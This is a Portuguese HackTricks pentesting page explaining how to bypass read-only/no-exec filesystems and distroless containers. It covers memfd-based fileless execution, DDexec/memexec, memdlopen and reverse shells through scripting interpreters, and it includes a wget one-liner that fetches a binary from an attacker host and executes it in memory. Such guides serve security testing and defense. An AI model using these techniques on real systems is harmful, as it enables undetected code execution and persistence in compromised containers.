# Bypassar proteções do sistema de arquivos: somente leitura / sem execução / Distroless

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Cenário de somente leitura / sem execução

É cada vez mais comum encontrar máquinas Linux montadas com a proteção de sistema de arquivos em **somente leitura (ro)**, especialmente em contêineres. Isso ocorre porque executar um contêiner com sistema de arquivos somente leitura é tão fácil quanto definir **`readOnlyRootFilesystem: true`** no `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

No entanto, mesmo que o sistema de arquivos esteja montado como somente leitura, **`/dev/shm`** ainda será gravável, então é falso que não podemos escrever nada no disco. No entanto, esta pasta será **montada com proteção sem execução**, então se você baixar um binário aqui, **não poderá executá-lo**.

{% hint style="warning" %}
Do ponto de vista de um red team, isso torna **complicado baixar e executar** binários que não estão no sistema (como backdoors ou enumeradores como `kubectl`).
{% endhint %}

## Bypass mais fácil: Scripts

Observe que mencionei binários, você pode **executar qualquer script** desde que o interpretador esteja dentro da máquina, como um **script de shell** se `sh` estiver presente ou um **script python** se o `python` estiver instalado.

No entanto, isso não é suficiente para executar seu backdoor binário ou outras ferramentas binárias que você possa precisar executar.

## Bypasses de Memória

Se você deseja executar um binário, mas o sistema de arquivos não permite isso, a melhor maneira de fazer isso é **executá-lo a partir da memória**, pois as **proteções não se aplicam lá**.

### Bypass FD + exec syscall

Se você tiver alguns mecanismos de script poderosos dentro da máquina, como **Python**, **Perl** ou **Ruby**, poderá baixar o binário para executar da memória, armazená-lo em um descritor de arquivo de memória (`create_memfd` syscall), que não será protegido por essas proteções e, em seguida, chamar uma **syscall `exec`** indicando o **fd como o arquivo a ser executado**.

Para isso, você pode usar facilmente o projeto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Você pode passar a ele um binário e ele irá gerar um script na linguagem indicada com o **binário comprimido e codificado em b64** com as instruções para **decodificar e descomprimir** em um **fd** criado chamando a syscall `create_memfd` e uma chamada à syscall **exec** para executá-lo.

{% hint style="warning" %}
Isso não funciona em outras linguagens de script como PHP ou Node porque eles não têm uma maneira **padrão de chamar syscalls brutos** de um script, então não é possível chamar `create_memfd` para criar o **fd de memória** para armazenar o binário.

Além disso, criar um **fd regular** com um arquivo em `/dev/shm` não funcionará, pois você não terá permissão para executá-lo devido à proteção **sem execução**.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) é uma técnica que permite **modificar a memória do próprio processo** sobrescrevendo seu **`/proc/self/mem`**.

Portanto, **controlando o código assembly** que está sendo executado pelo processo, você pode escrever um **shellcode** e "mutar" o processo para **executar qualquer código arbitrário**.

{% hint style="success" %}
**DDexec / EverythingExec** permitirá que você carregue e **execute** seu próprio **shellcode** ou **qualquer binário** da **memória**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Para obter mais informações sobre essa técnica, verifique o Github ou:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) é o próximo passo natural do DDexec. É um **shellcode demonizado do DDexec**, então toda vez que você quiser **executar um binário diferente**, não precisa reiniciar o DDexec, você pode simplesmente executar o shellcode memexec via técnica DDexec e então **comunicar-se com esse demônio para passar novos binários para carregar e executar**.

Você pode encontrar um exemplo de como usar o **memexec para executar binários a partir de um shell reverso PHP** em [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Com um propósito semelhante ao DDexec, a técnica [**memdlopen**](https://github.com/arget13/memdlopen) permite uma **maneira mais fácil de carregar binários** na memória para executá-los posteriormente. Isso pode até permitir o carregamento de binários com dependências.

## Bypass Distroless

### O que é distroless

Contêineres distroless contêm apenas os **componentes mínimos necessários para executar um aplicativo ou serviço específico**, como bibliotecas e dependências de tempo de execução, mas excluem componentes maiores como um gerenciador de pacotes, shell ou utilitários do sistema.

O objetivo dos contêineres distroless é **reduzir a superfície de ataque dos contêineres eliminando componentes desnecessários** e minimizando o número de vulnerabilidades que podem ser exploradas.

### Shell Reverso

Em um contêiner distroless, você pode **nem mesmo encontrar `sh` ou `bash`** para obter um shell regular. Você também não encontrará binários como `ls`, `whoami`, `id`... tudo o que você costuma executar em um sistema.

{% hint style="warning" %}
Portanto, você **não** poderá obter um **shell reverso** ou **enumerar** o sistema como costuma fazer.
{% endhint %}

No entanto, se o contêiner comprometido estiver executando, por exemplo, um aplicativo web Flask, o Python estará instalado e, portanto, você pode obter um **shell reverso do Python**. Se estiver executando o Node, você pode obter um shell reverso do Node, e o mesmo com quase qualquer **linguagem de script**.

{% hint style="success" %}
Usando a linguagem de script, você pode **enumerar o sistema** usando as capacidades da linguagem.
{% endhint %}

Se não houver proteções de **`somente leitura/sem execução`**, você pode abusar do seu shell reverso para **gravar no sistema de arquivos seus binários** e **executá-los**.

{% hint style="success" %}
No entanto, nesse tipo de contêineres, essas proteções geralmente existirão, mas você pode usar as **técnicas de execução de memória anteriores para contorná-las**.
{% endhint %}

Você pode encontrar **exemplos** de como **explorar algumas vulnerabilidades de RCE** para obter **shells reversos de linguagens de script** e executar binários da memória em [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
